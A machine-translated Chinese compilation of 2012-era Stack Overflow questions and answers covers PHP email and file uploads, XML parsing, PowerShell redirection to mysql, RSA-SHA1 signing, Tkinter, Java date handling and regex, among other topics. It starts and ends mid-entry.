或使用[众多可用插件之一](http://www.google.com/cse?cx=partner-pub-3005259998294962%3abvyni59kjr1&ie=ISO-8859-1&q=automatic%20close%20pairs&sa=Search&siteurl=www.vim.org/scripts/script_search_results.php?keywords=auto%2bclose&script_type=&order_by=rating&direction=descending&search=search&ref=www.vim.org/scripts/script_search_results.php?keywords=auto%2bclose&script_type=&order_by=creation_date&direction=descending&search=search#gsc.tab=0&gsc.q=automatic%20close%20pairs&gsc.page=1)。

# objective-c - 如何从 NSMutableDictionary 键中获取 uniq obj

> ID：10989597
> 
> 赞同：0
> 
> 时间：2012-06-12T01:43:03.057
> 
> 标签：objective-c

全部。我有一个 NSMutableArray ，它的名字是 dummyPerson。它的元素是 NSMutableDictionary。像下面这样的代码。我想排除重复的屏幕名称。

```

```
self.dummyPeople = [{screenName: "apple",tweet: "hi"},{screenName:"orange",tweet:"foo"},{screenName:"apple",tweet: "hoge"}];
// filteredByScreenName is procedure code.

[self.dummyPeople filteredByScreenName]

#=>  return [{screenName:"apple",tweet:"hi"},{screenName:"orange",tweet:"foo"}]; 
```

```

你有什么主意吗？提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T02:01:13.837

好吧，不打算为您编写代码，但这是我要做的：

创建一个临时数组来保存找到的名称。然后浏览数组中的每个字典。如果您的临时数组具有屏幕名称，请跳过它，否则将其添加到临时数组中。

# php - 用php发送电子邮件？

> ID：10989599
> 
> 赞同：1
> 
> 时间：2012-06-12T01:43:26.920
> 
> 标签：php, email, sendmail

我对 PHP 很陌生，正在尝试使用 php 在线订购网站。尝试使用“抄送”发送确认电子邮件时遇到问题。

每次处理订单时，订单总是发送到指定的“抄送”地址，但不会发送到“收件人”。很可能是由于我的代码中的错误。

在收到的电子邮件确认中，它仅显示 from 部分，而“to”部分为空，如下所示：

```
From: Business@business.co.uk
To: *This space is empty*
CC: orders@business.co.uk 
```

谁能帮忙指出我哪里出错了？我附上了下面的代码。

```
//Code to retreive customer email
 $query  = "SELECT od_email 
 FROM tbl_order";
  $result = mysql_query($query) or die(mysql_error());
    $data = mysql_fetch_assoc($result); 

//THIS IS THE EMAIL SENT TO THE CUSTOMER and the restaurant
//define the receiver of the email
$_SESSION['od_email'] = $data['od_email'];
$sendto = $_SESSION['od_email'];
//define the subject of the email
$subject = 'Order Confirmation | Ref No for Order: '.  $_SESSION['orderId']; //this session function works properly
//define the message to be sent. Each line should be separated with \n
$message = 'test';
//Who the message is from
$from = "business@business.co.uk";
$cc = "orders@business.co.uk";
//define the headers we want passed. Note that they are separated with \r\n
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= "From:" . $from . "\r\n";
//bcc header going to the restaurant
$headers .= "cc:" . $cc . "\r\n";
//send the email
$mail_sent = @mail( $sendto, $subject, $message, $headers );

unset($_SESSION['od_email']); 
```

我需要它显示的是：

```
From: **business@business.co.uk**
To: **$_SESSION['od_email'];**
CC: **orders@business.co.uk** 
```

提前感谢您提供的任何帮助

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2016-04-05T05:46:10.250

```
<?php 
session_start();
include 'connect.php';

error_reporting( error_reporting() & ~E_NOTICE);

 $message=$_POST['message'];
 $cc=$_POST['ccemail'];
 $bcc=$_POST['bccemail'];
 $emailid=$_POST['email'];
// $file=$_GET['file'];

$file=$_FILES['forwarded_file']['name'];
        $dest="admin/$file";
        $src=$_FILES['forwarded_file']['tmp_name'];

$run=mysql_query("SELECT od_email 
 FROM tbl_order");

 include 'classes/class.phpmailer.php';
 $mail = new PHPMailer(); // create a new object
 $mail->IsSMTP(); // enable SMTP
 $mail->Mailer = "smtp";
 $mail->SMTPDebug = 1; // debugging: 1 = errors and messages, 2 = messages only
 $mail->SMTPAuth = true; // authentication enabled
 $mail->Host = "smtp.gmail.com";
 $mail->SMTPSecure = "ssl";
 $mail->Port = 465; // 587
 $mail->IsHTML(true);
 $mail->Username = "business@business.co.uk";
 $mail->Password = "******"; //Don't reveal password with others
 $mail->SetFrom("business@business.co.uk");
 $mail->Subject  = "Test";
 $mail->Body ="Test";

$mail->AddAddress($emailid);
$mail->AddCC($cc);
$mail->AddBCC($bcc);

if (isset($_FILES['$file']) &&
    $_FILES['$file']['error'] == UPLOAD_ERR_OK) {
    $mail->AddAttachment($_FILES['$file']['tmp_name'],
                         $_FILES['$file']['name']);
}

$mail->AddAttachment($_FILES['forwarded_file']['tmp_name'],
                         $_FILES['forwarded_file']['name']);
 if(!$mail->Send())
 {
  "Mailer Error: " . $mail->ErrorInfo;
  echo "<script>alert('Not Send Successfully');document.location='../abc.php'</script>";
 }
 else
 {
 echo "Message has been sent";
echo "<script>alert('Send Successfully');document.location='../abc.php'</script>";
 }

?> 
```

这里也可以添加附件如果有的话。class.phpmailer.php是添加的库，coonect.php是连接数据库的连接文件。也可以在下面的[链接查看输出](http://yogeshprajapati.site88.net/sms_demo/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T11:45:50.840

您正在使用会话。并且您在使用它之前还没有开始任何会话。

开始会话。将此添加到页面顶部

```
session_start(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T10:51:13.410

看起来这个问题已经在评论中得到了回答 - 但完整：

该`$_SESSION['od_email']`变量没有被填充，因此“收件人”地址为空。

解决方案是添加一个查询以从最近的订单中获取用户名：

```
$sql = "SELECT od_email FROM tbl_order BY od_id DESC LIMIT 1"; 
$result = mysql_query($sql) or mysql_error(); 

//define the receiver of the email 
$row = mysql_fetch_row($result); 
$to = $row[0] 
```

# javascript - 如何在javascript中解析xml字符串？（不是客户端，浏览器相关）

> ID：10989604
> 
> 赞同：0
> 
> 时间：2012-06-12T01:44:23.007
> 
> 标签：javascript, xml, parsing, core

我想知道是否有人可以向我指出用于解析 xml 字符串的核心（不是客户端）JavaScript 解决方案。例如，把它变成一个我可以从中提取属性的对象。甚至是一个数组。

我搜索了高低，我看到的所有解决方案都是使用特定浏览器的 DOM 的客户端解决方案。请注意，我正在使用 JavaScript 编程，但这不是与 DOM 相关的问题。这是一个服务器端计算。

例如，我有这个字符串：
`<IndustryTerm count="2" relevance="0.553">food system</IndustryTerm><Person count="2" relevance="0.586">Alexandra Spieldoch</Person><Event count="1">Environmental Issue</Event><IndustryTerm count="1" relevance="0.154">rural finance</IndustryTerm><IndustryTerm count="1" relevance="0.335">food security</IndustryTerm><IndustryTerm count="1" relevance="0.280">e-consultation</IndustryTerm><IndustryTerm count="1" relevance="0.154">high-level food security dialogues</IndustryTerm><IndustryTerm count="1" relevance="0.154">food markets</IndustryTerm><Position count="1" relevance="0.335">representative</Position><SocialTags><SocialTag importance="2">Sociology<originalValue>Sociology</originalValue></SocialTag><SocialTag importance="2">Food security<originalValue>Food security</originalValue></SocialTag><SocialTag importance="1">Food politics<originalValue>Food politics</originalValue></SocialTag><SocialTag importance="1">Gender<originalValue>Gender</originalValue></SocialTag><SocialTag importance="1">Biology<originalValue>Biology</originalValue></SocialTag></SocialTags>`

我的目标是找到所有*相关性*和*重要性*值，以及标签之间的关联值。更具体地说，在这种情况下：

`<IndustryTerm count="1" relevance="0.154">food markets</IndustryTerm>`

我想知道标签名称（IndustryTerm）的相关性（0.154）以及打开和关闭标签（食品市场）之间的值。

我一直在摆弄正则表达式，但还不能“当场”，只是想知道那里是否有什么东西。

同样，这与客户端 JavaScript 或浏览器无关，但确实需要使用标准的 Core JavaScript。

道格

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T02:17:14.683

Core Javascript 内置了 XML 方法，这是您要找的吗？

[https://developer.mozilla.org/En/E4X/Processing_XML_with_E4X](https://developer.mozilla.org/En/E4X/Processing_XML_with_E4X)

```
var person = <person>
  <name>Bob Smith</name>
  <likes>
    <os>Linux</os>
    <browser>Firefox</browser>
    <language>JavaScript</language>
    <language>Python</language>
  </likes>
</person>;

alert(person.name); // Bob Smith
alert(person['name']); // Bob Smith
alert(person.likes.browser); // Firefox
alert(person['likes'].browser); // Firefox 
```

该链接包含使用列表、属性等的示例。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T14:33:52.977

您也许可以使用 SpiderMonkey 支持的替代语法来解析 XML。我从[Firefox nightly builds page](http://ftp.mozilla.org/pub/mozilla.org/firefox/nightly/latest-trunk/)中获取了一份[SpiderMonkey JavaScript Shell](https://developer.mozilla.org/En/SpiderMonkey/Introduction_to_the_JavaScript_shell)的副本，并从西伯利亚的示例中窃取，这是有效的：

```
js> options('allow_xml');
""
js> var person = new XML("<person><name>Bob Smith</name><likes><os>Linux</os><browser>Firefox</browser><language>JavaScript</language><language>Python</language></likes></person>");
js> person.name;
<name>Bob Smith</name>
js> person.name.text()
Bob Smith
js> person.likes.browser.text();
Firefox 
```

# redirect - 来自 PowerShell 的 cmd 输入重定向

> ID：10989606
> 
> 赞同：3
> 
> 时间：2012-06-12T01:44:43.723
> 
> 标签：redirect, powershell, input, cmd

我正在尝试使用来自文件的输入来运行 mysql。我发现以下工作：

cmd /c 'C:\Program Files\MySQL...\mysql -u user -pPassword databasename -f < inputfilename.sql'

问题是 databasename ($database) 和 inputfilename.sql ($file) 是变量，需要插值。我还没有找到使插值工作的任何方法。

请注意，invoke-expression 和 & 将不起作用，因为 PowerShell 没有为输入重定向实现 <。

有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-03-07T14:40:12.527

我和你的需求*完全*一样。以其他 SO 答案为例，[这](https://stackoverflow.com/a/17666285/540776)就是我写的：

```
$binPath = <local MySQL bin path>
$mySql = Join-Path $binPath "mysql"
...
$dosCommand = "$mySql --host=$dbHost --user=$dbUser --password=$dbPassword $dbName --verbose < ""$scriptPath"""
cmd.exe /c $dosCommand 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T02:28:34.500

您可能可以使用 Get-Content 如在此类似问题中所回答的那样，[为什么“<”输入重定向未在 Powershell 中实现？](https://stackoverflow.com/questions/6763086/why-is-input-redirect-not-implemented-in-powershell/6763153#comment8020985_6763153)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-06-12T15:13:25.737

看起来您将整个命令括在单引号中。变量不会被插入到单引号字符串中。尝试这个：

```
cmd /c 'C:\Program Files\MySQL\mysql' -u user -pPassword $database -f < $file 
```

# asp.net - 使用 XSLT 解析 XML？

> ID：10989608
> 
> 赞同：0
> 
> 时间：2012-06-12T01:45:02.193
> 
> 标签：asp.net, xml

如何使用 XSLT 解析 XML 文档？可能是我错了，是否可以使用 XSLT 解析 XML 文档？

这是 XML 文档：

```
<?xml version="1.0" encoding="utf-8" ?>
<cart>
  <item id="1">
    <name>Tyres</name>
    <cost>20</cost>
  </item>
  <item id="2">
    <name>Front Glass</name>
    <cost>30</cost>
  </item>
  <item id="3">
    <name>Vanity Mirror</name>
    <cost>10</cost>
  </item>
  <item id="4">
    <name>Brake Pads</name>
    <cost>50</cost>
  </item>
  <item id="5">
    <name>Brake Oil</name>
    <cost>40</cost>
  </item>
</cart> 
```

和 XSLT 页面：

```
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:msxsl="urn:schemas-microsoft-com:xslt" exclude-result-prefixes="msxsl"
>
    <xsl:output method="xml" indent="yes"/>

    <xsl:template match="shopping_cart">
      <root>
        <xsl:apply-templates select="cart"/>
      </root>        
    </xsl:template>
  <xsl:template match="cart">
    <cart>
      <xsl:attribute name="name">
        <xsl:value-of select="name"/>
      </xsl:attribute>
      <xsl:attribute name="cost">
        <xsl:value-of select="cost"/>
      </xsl:attribute>

    </cart>
  </xsl:template>
</xsl:stylesheet> 
```

有什么办法吗？请指导，因为我对解析概念不太了解。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T07:26:26.543

如果样式表只使用一个 XML 文档，则正常的机制是使其成为“主要输入文档”。根据处理器的 API，您通常可以以已解析或未解析的形式提供源文档；如果您以未解析的形式（例如作为 InputStream）提供它，它将自动被解析并作为节点树呈现给样式表。

如果您的样式表使用多个文档，您可以使用 document() 函数访问（和解析）辅助输入文档。

# php - 文件上传中的PHP错误处理

> ID：10989614
> 
> 赞同：0
> 
> 时间：2012-06-12T01:45:41.307
> 
> 标签：php, file-upload, if-statement, error-handling

当上传的图像大小超过 3MB 时，我想发出错误消息。这是我当前的代码。当图像超过 3MB 时，它会正确显示错误消息，但在没有上传图像时也会发出错误消息。我该如何解决？

```
//image check start
if ((($_FILES["file"]["type"] == "image/gif")
|| ($_FILES["file"]["type"] == "image/jpeg")
|| ($_FILES["file"]["type"] == "image/png")
|| ($_FILES["file"]["type"] == "image/pjpeg"))
&& ($_FILES["file"]["size"] < 3072000))
//image check end
{
    if($_FILES['file']['size'] > 0)
    {
        file uploading script
    } else {
        do nothing
    }
} else {
    error("Maximum image size exceeded or invalid file format.");
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T01:58:57.087

好吧，如果您在没有文件上传的情况下考虑您的情况，您会发现它会失败，因为您的类型检查都不会返回 true，因此它会在最后的 else 之后出现在错误行上。

你需要这样的东西：

```
if ( $_FILES['file']['size'] == 0 ) 
{
    // do nothing
} else {
    //image check start
    if ((($_FILES["file"]["type"] == "image/gif")
    || ($_FILES["file"]["type"] == "image/jpeg")
    || ($_FILES["file"]["type"] == "image/png")
    || ($_FILES["file"]["type"] == "image/pjpeg"))
    && ($_FILES["file"]["size"] < 3072000))
    //image check end
    {
        file uploading script
    } else {
        error("Maximum image size exceeded or invalid file format.");
    }
} 
```

显然，如果您真的不需要在没有上传文件的情况下执行任何操作，则可以：

```
if ( $_FILES['file']['size'] != 0 ) 
{
    //image check start
    if ((($_FILES["file"]["type"] == "image/gif")
    || ($_FILES["file"]["type"] == "image/jpeg")
    || ($_FILES["file"]["type"] == "image/png")
    || ($_FILES["file"]["type"] == "image/pjpeg"))
    && ($_FILES["file"]["size"] < 3072000))
    //image check end
    {
        file uploading script
    } else {
        error("Maximum image size exceeded or invalid file format.");
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T02:04:54.940

首先，您应该在调试时始终在脚本中启用错误报告。你可以这样做

```
error_reporting(E_ALL);
ini_set("display_errors", 1); 
```

如果你不确定你的错误来自哪里，你总是可以尝试做`print_r($_FILES);`，然后按照上面的逻辑进行。检查[文件上传错误](http://www.php.net/manual/en/features.file-upload.errors.php)`$_FILES['file']['error']`的变量。如果上传成功，它的值为.`0`

```
if ($_FILES["file"]["error"] !== 0) {
    if ($_FILES["file"]["size"]) > 0) {
        if ((($_FILES["file"]["type"] == "image/gif")
        || ($_FILES["file"]["type"] == "image/jpeg")
        || ($_FILES["file"]["type"] == "image/png")
        || ($_FILES["file"]["type"] == "image/pjpeg"))
        && ($_FILES["file"]["size"] < 3072000))
        //image check end
        {
            if($_FILES['file']['size'] > 0) {
                // file uploading script
            } 
            else {
                // do nothing
            }
        }
        else {
            error("Maximum image size exceeded or invalid file format.");
        }
    }
    else {
        error("Error uploading file. File has size of 0 bytes");
    }
}
else {
    error("There was an error uploading the file.
        File upload returned error code: " . $_FILES["file"]["error"]
    );
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-20T07:51:53.720

问题是

```
upload_max_filesize = 3M 
```

在我的 php.ini 文件中。当我将其更改为

```
upload_max_filesize = 4M 
```

一切正常。

谢谢。

# php - PHP soap客户端请求元素

> ID：10989622
> 
> 赞同：0
> 
> 时间：2012-06-12T01:46:21.180
> 
> 标签：php, web-services, soap

我正在尝试创建一个 SOAP 请求，该请求部分具有以下内容：

```
<com:locale language="?" country="?">
                     <com:descriptions>

                        <com:description type="?">This is a description</com:description>
                     </com:descriptions>
                     <com:marketingDescription>This is a marketing des</com:marketingDescription> 
```

我可以使用以下内容很好地添加属性：

```
function buildTask($db, $id=1) {
$task = array(
    'id' => $id++,
    'insertCustomProduct' => array(
                                    'manufacturerId' => "1234567",
                                    'manufacturerPartNo' => "ABC12345",

                                    'categoryId' => 10000000,
                                    'categoryType' => 'default',  
                                    'skus' => array(
                                                    'sku' => array(
                                                                    'type' => 'Internal',
                                                                    'number' => "123456ff",
                                                                    ),
                                                    ),
                                    'locales' => array(
                                                    'locale' => array(
                                                                    'language' => 'EN',
                                                                    'country' => 'US',
                                                                    'descriptions' => array(
                                                                                            'description' => array("type"=>1,
                                                                                                                    "CustomDescription"=>"This is a test")
                                                                                      ),
          'marketingDescription' => "This is the test Marketing Text",
        ),
      ),
    )
  ); 
```

我在传递非属性值时遇到问题，例如实际描述和营销文本

我将不胜感激任何帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T03:40:03.223

记录在案的“_”数组键应该为您提供部分 XML 的值（在此处的评论中[找到并在](https://stackoverflow.com/questions/2045850/using-soap-to-generate-xml-attributes-in-php)[此处](http://www.php.net/manual/en/soapclient.soapcall.php#90161)提及 SO ）。在您的示例中，这些内容 - 当然未经测试：

```
function buildTask($db, $id=1) {
$task = array(
    'id' => $id++,
    'insertCustomProduct' => array(
        'manufacturerId' => "1234567",
        'manufacturerPartNo' => "ABC12345",
        'categoryId' => 10000000,
        'categoryType' => 'default',  
        'skus' => array(
            'sku' => array(
                'type' => 'Internal',
                'number' => "123456ff",
                ),
            ),
        'locales' => array(
                'locale' => array(
                'language' => 'EN',
                'country' => 'US',
                'descriptions' => array(
                    'description' => array("type"=>1,
                                    "_"=>"This is a test")
                                              ),
                'marketingDescription' => array( "_" => "This is the test Marketing Text"),
            ),
        ),
    )
  ); 
```

# cryptography - 如何使用 OpenSSL 计算 RSA-SHA1(sha1WithRSAEncryption) 值

> ID：10989625
> 
> 赞同：13
> 
> 时间：2012-06-12T01:46:31.757
> 
> 标签：cryptography, openssl, rsa, digital-signature, xml-signature

我对 RSA-SHA1 感到困惑，我认为它是 RSA_private_encrypt(SHA1(message))。但我无法获得正确的签名值。有什么不对的吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-12T14:43:50.133

是的，PKCS#1 加密和 PKCS#1 签名是[不同](ftp://ftp.rsasecurity.com/pub/pkcs/pkcs-1/pkcs-1v2-1.pdf)的。在加密情况下（您尝试过的情况），输入消息在取幂之前被简单地填充。

另一方面，PKCS#1 签名将首先计算表单的 ASN.1 DER 结构

```
DigestInfo ::= SEQUENCE {
    digestAlgorithm AlgorithmIdentifier,
    digest OCTET STRING
} 
```

然后再次填充以形成编码消息 EM

```
EM = 0x00 || 0x01 || PS || 0x00 || T 
```

其中 PS 是足够长度的 0xff 填充字符串。如果您重现此 EM 并使用`RSA_private_encrypt`，那么您将获得正确的 PKCS#1 v1.5 签名编码，与使用通用[EVP_PKEY_sign](http://www.openssl.org/docs/crypto/EVP_PKEY_sign.html)`RSA_sign`获得的相同甚至更好。

下面是 Ruby 中的一个小演示：

```
require 'openssl'
require 'pp'

data = "test"
digest = OpenSSL::Digest::SHA256.new
hash = digest.digest("test")
key = OpenSSL::PKey::RSA.generate 512

signed = key.sign(digest, data)
dec_signed = key.public_decrypt(signed)

p hash
pp OpenSSL::ASN1.decode dec_signed 
```

SHA-256 哈希打印如下：

```
"\x9F\x86\xD0\x81\x88L}e\x9A/..." 
```

`dec_signed`是`RSA_sign`用公钥再次解密的结果——这让我们准确地返回了 RSA 函数的输入，去掉了填充，事实证明，这正是`DigestInfo`上面提到的结构：

```
 #<OpenSSL::ASN1::Sequence:0x007f60dc36b250
 @infinite_length=false,
 @tag=16,
 @tag_class=:UNIVERSAL,
 @tagging=nil,
 @value=
  [#<OpenSSL::ASN1::Sequence:0x007f60dc36b318
    @infinite_length=false,
    @tag=16,
    @tag_class=:UNIVERSAL,
    @tagging=nil,
    @value=
     [#<OpenSSL::ASN1::ObjectId:0x007f60dc36b390
       @infinite_length=false,
       @tag=6,
       @tag_class=:UNIVERSAL,
       @tagging=nil,
       @value="SHA256">,
      #<OpenSSL::ASN1::Null:0x007f60dc36b340
       @infinite_length=false,
       @tag=5,
       @tag_class=:UNIVERSAL,
       @tagging=nil,
       @value=nil>]>,
   #<OpenSSL::ASN1::OctetString:0x007f60dc36b2a0
    @infinite_length=false,
    @tag=4,
    @tag_class=:UNIVERSAL,
    @tagging=nil,
    @value="\x9F\x86\xD0\x81\x88L}e\x9A/...">]> 
```

如您所见，`digest`字段的值`DigestInfo`与我们自己计算的 SHA-256 哈希值相同。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-12T02:03:42.253

我认为您在错误的 OpenSSL 抽象级别上工作；您可能应该使用`rsa.h`-declared 函数[`RSA_sign()`](http://www.openssl.org/docs/crypto/RSA_sign.html)and `RSA_verify()`，它旨在用于[PKCS#1](https://www.rfc-editor.org/rfc/rfc3447#page-12)兼容签名。

# java - lastModified() 晚一小时

> ID：10989628
> 
> 赞同：2
> 
> 时间：2012-06-12T01:47:37.113
> 
> 标签：java, date, time, last-modified

我正在编写一个根据特定时间选择图像的程序。我将每个图像的名称存储在一个目录中，以及它最后修改时间以引用每个图像。但是，在存储每个图像的最后修改日期时，由于某种原因，它似乎落后了一个小时。这意味着将选择一小时后的图像。

```
System.out.println(listOfFiles[i].getName());

originalImageNames.add(listOfFiles[i].getAbsolutePath());

date = listOfFiles[i].lastModified();
Date fDate = new Date(date);

SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy HH:mm");
String dateString = sdf.format(fDate);
System.out.println(dateString);

originalImageDates.add(dateString); 
```

正在打印正确的图像名称，但该图像的最后修改时间是 10:29。然而，打印和存储的图像日期是 09:29。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-16T12:18:50.713

File.lastModified() 从纪元（格林威治标准时间 00:00:00，1970 年 1 月 1 日）开始以毫秒为单位运行。请注意 GMT 时区。SimpleDateFormat 补偿您当地的时区；所以如果你离格林威治标准时间一小时，那就可以解释了。

[http://docs.oracle.com/javase/7/docs/api/java/io/File.html#lastModified()](http://docs.oracle.com/javase/7/docs/api/java/io/File.html#lastModified()) [http://docs.oracle.com/javase/7/docs/api/java/text /SimpleDateFormat.html#format(java.util.Date](http://docs.oracle.com/javase/7/docs/api/java/text/SimpleDateFormat.html#format(java.util.Date) , java.lang.StringBuffer, java.text.FieldPosition)

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-06-13T01:03:46.097

我仍然不知道原因，但我设法通过手动添加一小时来修复我的程序。这不是我想要解决这个问题的方式，但在这个时间点上它会做到的！

解决问题的代码如下所示

```
 Calendar gc = new GregorianCalendar();
    gc.setTime(fDate);
    gc.add(Calendar.HOUR, 1);
    java.util.Date d2 =  gc.getTime(); 
```

谢谢 ：）

# actionscript-3 - AS3 gotoAndStop 卡住

> ID：10989631
> 
> 赞同：1
> 
> 时间：2012-06-12T01:48:07.577
> 
> 标签：actionscript-3, flash-cs4

我`gotoAndStop(100);`在第一帧中有一个非常简单的，似乎卡在第 50 帧上。在它之前的任何地方都没有问题，但是之后，它失败了。除了 stop(); 之外什么都没有。第 50 帧上的命令，即使我删除了所有动作，它仍然不起作用。有什么问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T08:47:35.587

您的 goToAndStop (100) 方法位于 if 语句中：

```
 if( getVal('v') != undefined ) {
     trace( "Skip to last scene" );
     gotoAndStop(100);
 } 
```

如果您尝试在该点跟踪 getVal ('v')，您会发现它是未定义的。所以 if 永远不会执行，并且 goToAndPlay 永远不会被触发。

# python - python中带有提交按钮的输入字段？

> ID：10989636
> 
> 赞同：3
> 
> 时间：2012-06-12T01:48:24.483
> 
> 标签：python, button, tkinter, tkinter-entry

我想创建一个密码和用户名输入字段。底部有一个“提交”按钮。这是我到目前为止所得到的，但我不知道如何使用网格：

所以这是将创建1个输入字段的代码，名称为“用户名”

```
from Tkinter import *
top = Tk()
L1 = Label(top, text="User Name")
L1.pack( side = LEFT)
E1 = Entry(top, bd =5)
E1.pack(side = RIGHT)
top.mainloop() 
```

这是我提交按钮的代码：

```
MyButton1 = Button(master, text="Submit", width=10, command=callback)
MyButton1.grid(row=0, column=0) 
```

我只是不知道如何将这两个代码放在一起。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-12T01:56:29.350

首先，不要混用`pack`和`grid`。

其次，您的按钮与您的条目具有不同的父级。替换`master`为`top`。并且不要忘记实际实现您的`callback`功能，否则它将无法正常工作。

```
from Tkinter import *

def callback():
    print 'You clicked the button!'

top = Tk()
L1 = Label(top, text="User Name")
L1.grid(row=0, column=0)
E1 = Entry(top, bd = 5)
E1.grid(row=0, column=1)

MyButton1 = Button(top, text="Submit", width=10, command=callback)
MyButton1.grid(row=1, column=1)

top.mainloop() 
```

# java - 使用映射值对 Java 列表进行排序

> ID：10989639
> 
> 赞同：0
> 
> 时间：2012-06-12T01:48:46.780
> 
> 标签：java, list, collections, map

我有一个 `Map`和一个`List`。`List`应该根据键值进行排序`Map`。例如：

```
Map = (<2,"Andy">,<4,"Karl">)
List = ("Kathy","Andy","Yiri","Jun","Karl") 
```

我必须以这样的方式对列表进行排序，即在 index : (2 : Andy) 应该在那里，并且在 index (4 : Karl) 应该在那里。对于其余元素顺序无关紧要。其余条件为：

1.  Map 中的条目可能会或可能不会出现在 List 中；（在此我们可以保持顺序相同）
2.  列表可能为空
3.  地图可能为空

我可以在 2 个循环中做到这一点，我很想知道是否有可能在一个循环中实现这一点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T02:07:22.903

您可以使用 1 循环遍历映射中的所有键，并使用 搜索 List 中的对象`indexOf(Object)`，然后使用`set`两次将对象交换到正确的位置。

伪代码（看起来像 Java）：

```
Set<Map.Entry<Integer, String>> entrySet = map.entrySet();
for (Map.Entry<Integer, String> e: entrySet) {
    int index;
    if ((index = list.indexOf(e.getValue())) >= 0 && index != e.getKey()) {
        list.set(index, list.set(e.getKey(), e.getValue()));
    }
} 
```

好吧，复杂性不是那么好：O(nk)，其中 n 是 List 中的元素数，k 是 Map 中的元素数。

# jquery - 如何在窗口调整大小时为元素宽度设置动画？

> ID：10989640
> 
> 赞同：0
> 
> 时间：2012-06-12T01:48:46.903
> 
> 标签：jquery, window-resize

不知道我这样做是否正确，但 jq 动画有点停滞，并且它会根据您是否按住鼠标（LC）调整大小而发生变化，从而每次都会产生奇怪的效果 [http://jsfiddle.net/yMcXm/15/](http://jsfiddle.net/yMcXm/15/)

如果窗口大小小于 680 像素，则所需的效果是平滑调整框的大小，如果大于 680，则将大小调整回 20%

我可能不确定使用了错误的功能。

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T02:03:55.273

尝试如下，

```
var timer = null;
$(window).resize(function() {
    var getWidth = $(window).width();

    if (timer != null) clearTimeout(timer);

    timer = setTimeout(function() {
        alert(getWidth);
        if (getWidth < 680) {
            $(".box").animate({
                width: "49%"
            }, 1000);
        } else if (getWidth > 680) {

            $(".box").animate({
                width: "20%"
            }, 1000);
        }
    }, 500);

}); 
```

**演示：http:** [//jsfiddle.net/yMcXm/16/](http://jsfiddle.net/yMcXm/16/)

# php - 如何从字符串中找到格式为“240x320”的分辨率大小？

> ID：10989641
> 
> 赞同：1
> 
> 时间：2012-06-12T01:49:11.903
> 
> 标签：php, regex

我有一个示例代码：

```
$text = "240 x 400 pixels, 3.0 inches (~155 ppi pixel density)"; 
```

并使用正则表达式：

```
preg_match_all('/(.*)( x )(.*)/i', $text, $arr);

print_r($arr[0]); 
```

结果没有改变，如何解决？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T01:52:13.787

你可能想要这个：`/(\d+)\s*x\s*(\d+)/i`

它将匹配一个数字`\d+`，然后是任意数量的空格`\s+`，然后`x`是任意数量的空格，然后是另一个数字`\d+`。它还捕获匹配数组的索引 1 和索引 2 中的数字。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T01:53:25.037

```
/(\d+)(?:\sx\s)(\d+)/i 
```

`.`小心使用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-12T01:54:07.440

此方法将为您提供访问这些值的宽度/高度的键。通过使用 \d 你只针对数字

```
$text = "240 x 400 pixels, 3.0 inches (~155 ppi pixel density)";
preg_match_all('/(?P<width>\d+) x (?P<height>\d+)/i', $text, $arr);
print_r($arr);exit; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-12T02:01:33.650

我猜你想把你的正则表达式改成这样：

```
preg_match_all('/(\d+) x (\d+)/i', $text, $arr); 
```

这 ”。” 匹配任何字符，所以当你使用`.*`它时，它只匹配整个字符串——你在它后面放什么并不重要。对于正则表达式，尽可能具体化通常是一个很好的经验法则。在这种情况下`\d+`将匹配一个或多个数字，因此当它到达第一个非数字时它将停止匹配，在这种情况下，一个空格。

这是`$arr`我使用您的`$text`字符串和更新的正则表达式得到的结果：

```
Array
(
    [0] => Array
        (
            [0] => 240 x 400
        )

    [1] => Array
        (
            [0] => 240
        )

    [2] => Array
        (
            [0] => 400
        )

) 
```

希望它更接近您正在寻找的东西。

# php - 标头重定向需要很长时间

> ID：10989649
> 
> 赞同：1
> 
> 时间：2012-06-12T01:50:11.180
> 
> 标签：php, redirect, header, location

我有两台服务器运行确切的代码，而登台服务器就像一个魅力，生产服务器在重定向时非常慢。

1.  [工作链接](http://staging.hemisphereinteractive.com/vidid/facebook.php?id=pZBk3c9DRNvWQcg7Ls4Q8V5CC9ugM9Bj&fid=4AAdR_VnE9f2)
2.  [响应延迟长的链接](http://player.boomvideo.tv/facebook.php?id=pZBk3c9DRNvWQcg7Ls4Q8V5CC9ugM9Bj&fid=4AAdR_VnE9f2)

我已经通过谷歌搜索并使用了一些替代方案，但似乎没有任何效果。

当前方法

```
